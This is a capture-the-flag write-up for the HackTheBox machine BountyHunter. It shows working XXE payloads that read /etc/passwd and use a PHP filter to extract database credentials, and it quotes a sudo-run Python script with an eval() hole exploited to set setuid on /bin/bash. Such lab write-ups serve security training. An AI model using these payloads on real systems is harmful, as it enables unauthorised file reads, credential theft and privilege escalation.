---
layout: post
title: HackTheBox BountyHunter Write-up
---

<h2>Overview</h2>

BountyHunter is an easy-rated Linux machine on HackTheBox. It's running a website with an XML parser, which I can abuse with an XXE attack. In doing so, I'm able to read the contents of a
database file containing credentials which can be used to ssh in.

<h2>Initial Enumeration</h2>

Initial nmap scan reveals two ports open, ssh on 22 and an Apache website on 80.

```
┌──(kali㉿kali)-[~/…/Labs/htb/htb-active/temp]
└─$ sudo nmap -sC -sV --min-rate 10000 10.10.11.100          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-01 08:58 GMT
Nmap scan report for 10.10.11.100
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
```

<h2>"Bounty Hunters" website</h2>

Heading over to the website in my browser I'm greeted with this page:

![image](https://user-images.githubusercontent.com/44827973/144485752-7dfc04ad-3b30-4c88-b230-87825b0eaa3d.png)


Clicking "PORTAL" in the top right leads me to the message below.

![image](https://user-images.githubusercontent.com/44827973/144485841-e98ae5fb-ff69-4bd2-8530-63a379616eef.png)

Following the link, I find a submission form for reporting bug bounties.

![image](https://user-images.githubusercontent.com/44827973/144485922-9f121baa-8415-4190-a20e-123f452ecccc.png)

I put in some test values and when submitted, the page returns the same values. Nothing too special appears to be happening.

![image](https://user-images.githubusercontent.com/44827973/144567274-7eca24fe-4792-43a6-8f09-f291413842b2.png)

<h3>XXE attacks</h3>

I want to see if there's interesting in the POST request that can be abused. I fire up Burp Suite and intercept some test values:

![image](https://user-images.githubusercontent.com/44827973/144486504-dc51dfbf-6b33-42f6-a770-8d1757ef15c0.png)

The intercepted POST request has a single parameter, data. Instantly I recognise it as URL-encoded, due to the presence of %3D%3D which is URL-encoded "==" characters.

![image](https://user-images.githubusercontent.com/44827973/144486580-51b59c93-4f46-4d7b-9f46-79a23647b8f8.png)

I send the data to Burp's Decoder. First I URL-decode it, and I receive what looks like a base64-encoded string. What gives it away is the "=" characters, which sometimes pads the end of base64-encoded strings.
So then I base64-decode the URL-decoded data. You can see the results below.

![image](https://user-images.githubusercontent.com/44827973/144486896-cb908a70-54be-40c5-8a10-530d0282130c.png)

It looks like the data being sent to the web server is XML-formatted. Because the web server is likely to process XML data, I may be able to conduct an XXE attack.

An XML eXternal Entity (XXE) attack abuses the parsing of XML data by creation of a custom XML entity. These are called External entities because they are defined from outside of the Document Type Definition (DTD).
We can define an entity to contain the contents of a file.

I test this by following the XML example as per the [https://portswigger.net/web-security/xxe](XXE article on Portswigger).

Here is my payload to attempt to read the contents of /etc/passwd:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>&xxe;</reward>
</bugreport>
```
Using Burp's Decoder, I encode in the reverse order of which the data was decoded, i.e. base64 and then URL.

I substitute this data back into the data parameter of the intercepted POST request.

![image](https://user-images.githubusercontent.com/44827973/144491846-5d8aa284-8e38-408b-aece-0e4dbafe0e6a.png)

The XXE attack is successful, and I am able to read the contents of /etc/passwd. I find one user account, "development".

With the information gathered so far, there aren't many other interesting files I can read at this point. Good options may be development's id_rsa for ssh, or /etc/shadow for passwords. I'm unable to read development's id_rsa file because the web server is likely running as www-data which won't have permission, and I'm unable to read /etc/shadow which by default has even stricter permissions.

<h3>Directory Busting</h3>

I run feroxbuster against the website, using default settings. Nothing too interesting is found.

![image](https://user-images.githubusercontent.com/44827973/144559968-0cd09907-4eff-49cc-9173-84cb032016ab.png)

Running it again with extensions reveals some interesting files.

![image](https://user-images.githubusercontent.com/44827973/144560037-d792b5cc-cfa2-4c4b-812a-7653ca4747ec.png)

Contents of /resources/README.txt:

![image](https://user-images.githubusercontent.com/44827973/144560071-63c62fab-3253-4ece-b8c2-d2165e34da8f.png)

I'm unable to view db.php. PHP files are executed by the server and only output the result to the client, we cannot usually read php source code.

<h3>Reading db.php via php wrapper</h3>

I already know I can read system file contents via XXE injections. What happens if I try to read db.php in this way?

The Payload:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file=db.php"> ]>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>&xxe;</reward>
</bugreport>
```

Unfortunately, nothing is returned.

![image](https://user-images.githubusercontent.com/44827973/144560863-3027c2a9-7d71-4778-abc8-35487732b140.png)

What if we were to use a PHP wrapper?

I can use a PHP wrapper to try base64-encode the file. According to the PHP manual:

*php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.*

I modify the XML input as below. This will hopefully return a base64-encoded string containing the contents of db.php.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>&xxe;</reward>
</bugreport>
```
This time I'm successful in receiving what should be a base64 string.

![image](https://user-images.githubusercontent.com/44827973/144561794-fad0ebbe-b67b-4afd-824c-bc98157f72f2.png)

If I base64-decode this string, I get credentials.

![image](https://user-images.githubusercontent.com/44827973/144561898-52d8f3aa-5e6a-42a2-9f99-49d03ade7cc6.png)

Although there isn't an admin user to ssh in with, I test the password with the development user.

![image](https://user-images.githubusercontent.com/44827973/144561950-9eef6936-9c27-4e87-8438-e15ebfc053dd.png)

It works! I'm able to read the user.txt file.

![image](https://user-images.githubusercontent.com/44827973/144561982-b75380fe-ee36-46b3-870c-a0f538393e40.png)

<h2>Escalation to root</h2>

<h3>Abusing sudo command</h3>

The development user can run the following command as root:

![image](https://user-images.githubusercontent.com/44827973/144562391-ad43eddc-42ae-41a7-8fe4-0676a4489599.png)

The contents of ticketValidator.py:

```
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The python script is a simple but fun riddle. Going through how it operates:

1. It reads a given file input. If it doesn't have .md extension, the script exits.
2. It then runs the script-defined function "evaluate", doing the following:
	a. If the first line doesn't start with "# Skytrain Inc", the script exits.
	b. If the second line doesn't start with "## Ticket to ", the script exits.
	c. If any of the lines start with "__Ticket Code:__", it sets the variable `code_line` to the current line iteration + 1.
	d. If on any line, code_line is set (not "None") and is equal to the current line iteration `i`, the script enters the dangerous code section.
	e. The line must start with two asterisks, or the script exits.
	f. The line has the double asterisks removed, and is split on the "+" character. The first split must equal 4 when the number modulo 7, otherwise script exits. Needless 	    to say, the first split should be an integer.
	g. The script eval()'s the line with the double asterisks stripped.
	h. If the return value of eval() of the line is <= 100, the script exits. *This doesn't actually matter, as we've already eval'd what we want to eval.* 

I create an .md file to allow script execution until eval() is able to execute, adhering to the aforementioned rules. I've added a command to give /bin/bash setuid permissions.

```
development@bountyhunter:~$ cat hi.md
# Skytrain Inc
## Ticket to Harry Potter Museum
__Ticket Code:__
**704+__import__('os').system('chmod u+s /bin/bash')
```

I run the sudo command, specifying my .md file. I'm able to run /bin/bash and become root, and can read the contents of root.txt.

![image](https://user-images.githubusercontent.com/44827973/144566990-f66afe93-1cd0-4346-8f4d-0180ffc61635.png)
